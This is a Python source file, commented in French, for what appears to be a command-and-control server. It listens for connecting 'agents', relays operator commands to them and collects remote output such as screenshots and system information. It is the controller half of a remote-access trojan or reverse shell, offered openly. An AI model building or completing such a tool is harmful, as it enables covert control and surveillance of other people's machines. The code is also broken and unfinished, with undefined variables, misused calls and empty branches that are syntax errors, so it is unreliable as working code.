import socket as s
import io
from PIL import Image
import time
from threading import Thread
from socketserver import ThreadingMixIn

command = str()
counter = 0
host = ""
portS = "1234"
choixMenu = ()

#class
class myThread(Thread):
    def __init__(self,ip,port):
        Thread.__init__(self)
        self.ip = ip
        self.port = port
        print ("[+] Nouveau thread démarré pour " + ip + ":" + str(port))

    def run(self):
        while command != "exit":
            print("#")
            command = input()
            conf.send(command.encode('UTF-8'))
            if command == "screen":
                message= conf.recv(262144)
                f = open("note","wb")
                f.write(message)
                f.close()
                f.save("monitor-screen.png")
            elif command == "os":
                message = conf.recv(262144)
                message = message.decode("UTF-8")
                print(message)
            elif command == "candc":
                message = conf.recv(262144)
                message = message.decode("UTF-8")
                print(message)
            else:
                message = conf.recv(262144)
                print(message)
                message = message.decode('850')
                print(message)
        mon_socket.close()
        conf.close()


# Création du socket
mon_socket = s.socket(s.AF_INET,s.SOCK_STREAM)
s.setsockopt(s.SOL_SOCKET, s.SO_REUSEADDR, 1)
mon_socket.bind((host,port))
mythreadTab = []
print("Serveur prêt, en attente de requêtes")

while True:
    ##### Menu ###
# 1 Faire connecter les agents
# 2 voir les agents actuelle
# 3 se connecter à un agents*
# 4 exit
    x = 1
    print("############## Menu ##############")
    print("1 Faire connecter les agents")
    print("2 Voir les agents connecter")
    print("3 Se connecter à un agents")
    print("Quittez le programme")
    choixMenu = input()

    if choixMenu == "1":
        while x == 1:
            print("En attente de connexion")
            mon_socket.listen(5)
            conf,ADRESSE = mon_socket.accept()
            print("Connexion établie, adresse %s, port %s "%(format(ADRESSE[0], ADRESSE[1])))
            mythread = myThread(ADRESSE[0],ADRESSE[1])
            mythreadTab.append(mythread)
            mythread.start()
            print("Pour quitter, ecrire 2")
            x = input()


    elif choixMenu == "2":
        for t in mythreadTab:
            print("%s Connexion : adresse %s, port %s"%(t,mythreadTab[t,[0,0],mythreadTab[t,[0,1]]))

    elif choixMenu == "3":


    elif choixMenu == "3":


# 1 Faire les connecter les agents











for t in mythreadTab:
    t.join()


### Code multithearding en cour
